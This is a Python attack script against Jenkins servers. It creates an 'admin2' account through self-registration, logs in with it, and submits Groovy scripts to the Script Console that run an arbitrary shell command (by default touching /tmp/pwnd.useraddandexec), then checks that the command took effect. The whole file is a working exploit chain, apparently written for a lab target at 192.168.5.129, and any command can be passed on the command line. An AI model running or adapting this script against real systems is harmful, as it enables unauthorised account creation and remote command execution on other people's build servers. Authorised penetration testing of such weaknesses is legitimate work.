#!/usr/bin/env python3
"""
JENKINS USER ADD AND EXECUTE
============================

Creates admin2 user, logs in, and executes system commands
"""

import requests
import re
import sys
import urllib3
import argparse
from typing import Optional, Union, Dict, Any

urllib3.disable_warnings()

class JenkinsUserAddAndExec:
    def __init__(self, target_url: str = "http://192.168.5.129:8080"):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False

        # Set proper headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

    def authenticate(self, username: str = "testuser1476", password: str = "testpass123"):
        """Authenticate with CSRF protection"""
        print(f"[AUTH] Authenticating as: {username}")

        # Get CSRF token from signup page
        response = self.session.get(f"{self.target_url}/signup", timeout=10)
        csrf_match = re.search(r'Jenkins-Crumb[^>]*value="([^"]+)"', response.text, re.IGNORECASE)

        if not csrf_match:
            print("[!] No CSRF token found")
            return False

        csrf_token = csrf_match.group(1)

        # Login
        login_data = {
            'j_username': username,
            'j_password': password,
            'from': '/',
            'Jenkins-Crumb': csrf_token
        }

        response = self.session.post(
            f"{self.target_url}/j_spring_security_check",
            data=login_data,
            timeout=10,
            allow_redirects=True
        )

        # Verify authentication
        whoami_response = self.session.get(f"{self.target_url}/whoAmI/api/json", timeout=10)
        if whoami_response.status_code == 200:
            whoami_data = whoami_response.json()
            if whoami_data.get('name') == username and not whoami_data.get('anonymous', True):
                print(f"[+] Successfully authenticated as: {username}")
                return True

        print("[!] Authentication failed")
        return False

    def add_user(self, username: str = "admin2", password: str = "admin2", fullname: str = "Admin User 2", email: str = "admin2@jenkins.local"):
        """Add a new user via self-registration"""
        print(f"\n[*] Creating user via self-registration: {username}")

        try:
            # Get the signup page to extract CSRF token
            response = self.session.get(f"{self.target_url}/signup", timeout=10)
            if response.status_code == 404:
                print("[!] Signup page not found (404) - self-registration disabled")
                return False
            elif response.status_code != 200:
                print(f"[!] Cannot access signup page - status {response.status_code}")
                return False
                
            # Check if signup is actually supported
            if "signup not supported" in response.text.lower() or "sign up not allowed" in response.text.lower():
                print("[!] Self-registration not supported by this Jenkins instance")
                return False

            # Extract CSRF token
            csrf_match = re.search(r'Jenkins-Crumb[^>]*value="([^"]+)"', response.text, re.IGNORECASE)
            if not csrf_match:
                print("[!] No CSRF token found in signup page - self-registration likely disabled")
                return False

            csrf_token = csrf_match.group(1)
            print(f"🔑 CSRF Token: {csrf_token[:20]}...")

            # Prepare user registration data
            user_data = {
                'username': username,
                'password1': password,
                'password2': password,
                'fullname': fullname,
                'email': email,
                'Jenkins-Crumb': csrf_token
            }

            print(f"[*] Registering user: {username}")

            # Submit user registration
            response = self.session.post(
                f"{self.target_url}/securityRealm/createAccount",
                data=user_data,
                timeout=10,
                allow_redirects=False
            )

            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response location: {response.headers.get('Location', 'None')}")

            # Check if we got redirected to main Jenkins page (successful registration)
            if response.status_code == 200 and "<title>Jenkins</title>" in response.text:
                print(f"[+] User {username} created successfully via self-registration (redirected to main page)")
                return True

            # Only accept 302 redirects as success for user creation
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'login' in location or location.endswith('/') or 'securityRealm' in location:
                    print(f"[+] User {username} created successfully via self-registration")
                    return True

            # Check for actual success messages in 200 responses (more strict)
            if response.status_code == 200:
                # Only consider it success if we see very specific success indicators
                if ("user created" in response.text.lower() or 
                    "account has been created" in response.text.lower() or
                    "registration successful" in response.text.lower()):
                    print(f"[+] User {username} created successfully via self-registration")
                    return True

            print(f"[!] User registration failed: {response.status_code}")
            print(f"Response content (first 1000 chars): {response.text[:1000]}...")
            return False

        except Exception as e:
            print(f"[!] Error registering user: {e}")
            return False

    def authenticate_as_new_user(self, username: str = "admin2", password: str = "admin2"):
        """Authenticate as the newly created user"""
        print(f"\n🔐 Authenticating as newly created user: {username}")

        # Create a new session for the new user
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

        # Get CSRF token from signup page
        response = self.session.get(f"{self.target_url}/signup", timeout=10)
        csrf_match = re.search(r'Jenkins-Crumb[^>]*value="([^"]+)"', response.text, re.IGNORECASE)

        if not csrf_match:
            print("[!] No CSRF token found for new user login")
            return False

        csrf_token = csrf_match.group(1)

        # Login as new user
        login_data = {
            'j_username': username,
            'j_password': password,
            'from': '/',
            'Jenkins-Crumb': csrf_token
        }

        response = self.session.post(
            f"{self.target_url}/j_spring_security_check",
            data=login_data,
            timeout=10,
            allow_redirects=True
        )

        # Verify authentication
        whoami_response = self.session.get(f"{self.target_url}/whoAmI/api/json", timeout=10)
        if whoami_response.status_code == 200:
            whoami_data = whoami_response.json()
            if whoami_data.get('name') == username and not whoami_data.get('anonymous', True):
                print(f"[+] Successfully authenticated as: {username}")
                return True

        print("[!] New user authentication failed")
        return False

    def execute_system_command(self, command: Optional[str] = None):
        """Execute system command via Script Console"""
        if command is None:
            command = "touch /tmp/pwnd.useraddandexec"

        print(f"\n⚡ Executing command: {command}")

        # First get the script console page to extract CSRF token
        try:
            response = self.session.get(f"{self.target_url}/script", timeout=10)
            if response.status_code != 200:
                print("[!] Cannot access script console")
                return False

            # Extract CSRF token
            csrf_match = re.search(r'Jenkins-Crumb[^>]*value="([^"]+)"', response.text, re.IGNORECASE)
            if not csrf_match:
                print("[!] No CSRF token found in script console")
                return False

            csrf_token = csrf_match.group(1)

            # Create Groovy script to execute system command
            # Use array approach to avoid shell escaping issues
            groovy_script = f'''
try {{
    def command = "{command}"
    println "=== EXECUTING COMMAND ==="
    def proc = command.execute()
    proc.waitFor()
    
    println "Command: " + command
    println "Exit code: " + proc.exitValue()
    println "STDOUT:"
    println proc.text
    println "STDERR:" 
    println proc.err.text
    println "=== COMMAND COMPLETE ==="
}} catch (Exception e) {{
    println "ERROR: " + e.getMessage()
    e.printStackTrace()
}}
'''

            # Execute the script - try different submission methods
            script_data = {
                'script': groovy_script,
                'Jenkins-Crumb': csrf_token,
                'Submit': 'Run'  # Add explicit submit button value
            }

            # Try the scriptText endpoint first (some Jenkins versions use this)
            endpoints_to_try = [
                f"{self.target_url}/scriptText",
                f"{self.target_url}/script",
            ]
            
            success = False
            for endpoint in endpoints_to_try:
                try:
                    print(f"[*] Trying endpoint: {endpoint}")
                    response = self.session.post(
                        endpoint,
                        data=script_data,
                        timeout=15,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'}
                    )
                    
                    if response.status_code == 200:
                        # Check if this looks like a script execution result
                        if ('=== EXECUTING COMMAND ===' in response.text or 
                            'Command:' in response.text or
                            len(response.text.strip()) < 1000):  # scriptText returns just the result
                            print(f"[+] Success with endpoint: {endpoint}")
                            success = True
                            break
                except Exception as e:
                    print(f"[!] Error with endpoint {endpoint}: {e}")
                    continue
            
            if not success:
                print("[!] All endpoints failed, using last response")
                
            if response.status_code == 200:
                print("[+] Command executed successfully")
                print("📄 Script output:")
                print("-" * 50)

                # Look for our specific output markers in the HTML response
                result_patterns = [
                    r'=== EXECUTING COMMAND ===(.*?)=== COMMAND COMPLETE ===',
                    r'STDOUT:\s*\n(.*?)(?:STDERR:|=== COMMAND COMPLETE ===)',
                    r'<h3>Result</h3>\s*<div[^>]*>(.*?)</div>',
                    r'Result</h3>\s*<div[^>]*>(.*?)</div>',
                    r'<pre[^>]*id="out"[^>]*>(.*?)</pre>',
                    r'<pre[^>]*>(.*?)</pre>',
                ]
                
                result_found = False
                full_result = ""
                for pattern in result_patterns:
                    result_match = re.search(pattern, response.text, re.DOTALL | re.IGNORECASE)
                    if result_match:
                        output = result_match.group(1).strip()
                        # Clean up HTML entities and tags
                        output = re.sub(r'&amp;', '&', output)
                        output = re.sub(r'&lt;', '<', output)
                        output = re.sub(r'&gt;', '>', output)
                        output = re.sub(r'<[^>]+>', '', output)  # Remove HTML tags
                        
                        if output and output != '' and len(output) > 5:  # Ignore very short results
                            print(f"Output: {output}")
                            full_result = output
                            result_found = True
                            break
                
                if not result_found:
                    # Show part of the response for debugging
                    print("No result pattern matched. Raw response content (first 2000 chars):")
                    print(response.text[:2000])
                    print("-" * 50)
                    print("Looking for Result section in HTML...")
                    
                    # Try a simpler approach - look for any text after "Result"
                    if "Result" in response.text:
                        lines = response.text.split('\n')
                        result_section = False
                        for line in lines:
                            if "Result" in line:
                                result_section = True
                                continue
                            if result_section and line.strip():
                                print(f"Found potential output: {line.strip()}")
                                break

                print("-" * 50)
                return True
            else:
                print(f"[!] Command execution failed: {response.status_code}")
                print(f"Response: {response.text[:300]}...")
                return False

        except Exception as e:
            print(f"[!] Error executing command: {e}")
            return False

    def verify_command_execution(self, command: Optional[str] = None):
        """Verify that the command was executed by checking for created files"""
        if command is None:
            command = "touch /tmp/pwnd.useraddandexec"

        print(f"\n🔍 Verifying command execution: {command}")

        # For touch command, check if file exists
        if "touch" in command and "/tmp/" in command:
            filename = command.split()[-1]

            # Try to read the file via script console
            verify_script = f"""
def file = new File('{filename}')
if (file.exists()) {{
    println "SUCCESS: File {filename} was created"
    println "File size: " + file.size() + " bytes"
    println "Last modified: " + new Date(file.lastModified())
}} else {{
    println "FAILED: File {filename} was not created"
}}
"""

            try:
                response = self.session.get(f"{self.target_url}/script", timeout=10)
                csrf_match = re.search(r'Jenkins-Crumb[^>]*value="([^"]+)"', response.text, re.IGNORECASE)
                if csrf_match:
                    csrf_token = csrf_match.group(1)

                    script_data = {
                        'script': verify_script,
                        'Jenkins-Crumb': csrf_token
                    }

                    response = self.session.post(
                        f"{self.target_url}/script",
                        data=script_data,
                        timeout=15
                    )

                    if response.status_code == 200:
                        print("[+] Verification completed")
                        return True

            except Exception as e:
                print(f"[!] Verification error: {e}")

        return False

def main():
    parser = argparse.ArgumentParser(description='Jenkins User Add and Execute')
    parser.add_argument('--host', default='192.168.5.129', help='Target host (default: 192.168.5.129)')
    parser.add_argument('--port', default='8080', help='Target port (default: 8080)')
    parser.add_argument('--command', default='touch /tmp/pwnd.useraddandexec', help='Command to execute (default: touch /tmp/pwnd.useraddandexec)')
    
    args = parser.parse_args()
    
    target_url = f"http://{args.host}:{args.port}"
    
    print("JENKINS USER ADD AND EXECUTE")
    print("="*35)
    print(f"Target: {target_url}")
    print(f"Command: {args.command}")
    print("Creating admin2 user and executing system commands")
    print()

    # Initialize the tool with target URL
    tool = JenkinsUserAddAndExec(target_url)

    # Step 1: Create new user via self-registration
    user_created = tool.add_user()
    if not user_created:
        print("[!] User creation failed - trying to login with existing credentials...")
        
        # Try to login with admin2/admin2 in case user already exists
        if not tool.authenticate_as_new_user():
            print("[!] Cannot proceed - user creation failed and login with existing credentials failed")
            return
        else:
            print("[+] Successfully logged in with existing admin2 credentials")
    else:
        # Step 2: Login as the newly created user
        if not tool.authenticate_as_new_user():
            print("[!] Cannot proceed without new user authentication")
            return

    # Step 3: Execute system command
    if not tool.execute_system_command(args.command):
        print("[!] Command execution failed")
        return

    # Step 4: Verify execution
    tool.verify_command_execution(args.command)

    print("\n[*] USER REGISTRATION AND EXECUTE COMPLETE")
    if user_created:
        print("admin2 user created and command executed successfully")
    else:
        print("Logged in with existing admin2 user and command executed successfully")

if __name__ == "__main__":
    main()
